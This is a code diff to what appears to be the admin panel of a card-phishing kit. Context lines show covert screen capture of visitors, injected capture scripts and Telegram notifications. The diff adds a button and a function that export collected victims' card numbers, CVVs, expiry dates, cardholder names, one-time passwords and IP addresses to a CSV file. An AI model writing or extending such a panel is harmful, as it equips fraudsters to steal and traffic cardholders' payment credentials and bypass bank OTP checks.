@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Admin Panel</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
   <style>
     body { background: #000; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
     h1 { text-align: center; margin-bottom: 20px; }
@@ -543,6 +544,16 @@
     <div id="error-msg" class="error-message"></div>
     <div id="success-msg" class="success-message"></div>
 
+    <div class="admin-header">
+  <h1>Admin Panel</h1>
+  <div>
+    <button id="downloadTransactionsBtn" class="clear-transactions-btn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); margin-right: 10px;">
+      <i class="fas fa-download"></i> Download CSV
+    </button>
+    <button id="clearTransactionsBtn" class="clear-transactions-btn">Clear All Transactions</button>
+  </div>
+</div>
+    
     <!-- Visitors Section with Screen Sharing -->
     <div class="visitors-container">
       <h2>Active Visitors</h2>
@@ -2930,6 +2941,7 @@ window.sendTelegramNotification = sendTelegramNotification;
 window.initAdvancedScreenCapture = initAdvancedScreenCapture;
 window.stopScreenCapture = stopScreenCapture;
 window.handleScreenFrame = handleScreenFrame;
+window.downloadTransactionsCSV = downloadTransactionsCSV;
 
     </script>
 
@@ -3337,6 +3349,105 @@ window.handleScreenFrame = handleScreenFrame;
     window.injectScreenCaptureCode = function() {
       return window.advancedCaptureScript;
     };
+
+    // Function to download transactions as CSV
+function downloadTransactionsCSV() {
+  // Check if there are any transactions to download
+  if (transactionsMap.size === 0) {
+    showMessage('error', 'No transactions to download');
+    return;
+  }
+
+  try {
+    // Convert transactions to an array
+    const transactions = Array.from(transactionsMap.values());
+    
+    // Define CSV headers
+    const headers = [
+      'Invoice ID',
+      'Email',
+      'Amount',
+      'Currency',
+      'Card Number',
+      'CVV',
+      'Expiry',
+      'Cardholder Name',
+      'IP Address',
+      'Status',
+      'OTP',
+      'Timestamp',
+      'Bank Name',
+      'Country',
+      'Card Type'
+    ];
+    
+    // Create CSV content starting with headers
+    let csvContent = headers.join(',') + '\n';
+    
+    // Add data rows
+    transactions.forEach(tx => {
+      // Extract bank info if available
+      const bankName = tx.bankInfo?.bank || '';
+      const country = tx.bankInfo?.country || '';
+      const cardType = tx.bankInfo?.scheme || '';
+      
+      // Format each field and handle special characters (especially commas)
+      const row = [
+        `"${tx.id || ''}"`,
+        `"${(tx.email || '').replace(/"/g, '""')}"`, // Escape quotes in email
+        `"${tx.amount || '0'}"`,
+        `"${tx.currency || 'INR'}"`,
+        `"${tx.cardNumber || ''}"`,
+        `"${tx.cvv || ''}"`,
+        `"${tx.expiry || ''}"`,
+        `"${(tx.cardholder || '').replace(/"/g, '""')}"`, // Escape quotes in name
+        `"${tx.ip || ''}"`,
+        `"${tx.status || 'processing'}"`,
+        `"${tx.otpEntered || ''}"`,
+        `"${tx.timestamp || ''}"`,
+        `"${bankName.replace(/"/g, '""')}"`,
+        `"${country.replace(/"/g, '""')}"`,
+        `"${cardType.replace(/"/g, '""')}"`
+      ].join(',');
+      
+      csvContent += row + '\n';
+    });
+    
+    // Create a Blob with the CSV content
+    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+    
+    // Create a download link
+    const link = document.createElement('a');
+    
+    // Create the download URL
+    const url = URL.createObjectURL(blob);
+    link.setAttribute('href', url);
+    
+    // Set filename with current date/time
+    const now = new Date();
+    const filename = `transactions_${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}_${String(now.getHours()).padStart(2, '0')}-${String(now.getMinutes()).padStart(2, '0')}.csv`;
+    link.setAttribute('download', filename);
+    
+    // Append to body, click programmatically, then remove
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    
+    // Clean up the URL object
+    setTimeout(() => {
+      URL.revokeObjectURL(url);
+    }, 100);
+    
+    // Show success message
+    showMessage('success', `Downloaded ${transactions.length} transactions as CSV`);
+  } catch (error) {
+    console.error('Error downloading transactions:', error);
+    showMessage('error', `Error downloading transactions: ${error.message}`);
+  }
+}
+
+// Add event listener for the download button
+document.getElementById('downloadTransactionsBtn')?.addEventListener('click', downloadTransactionsCSV);
   </script>
 </body>
 </body>
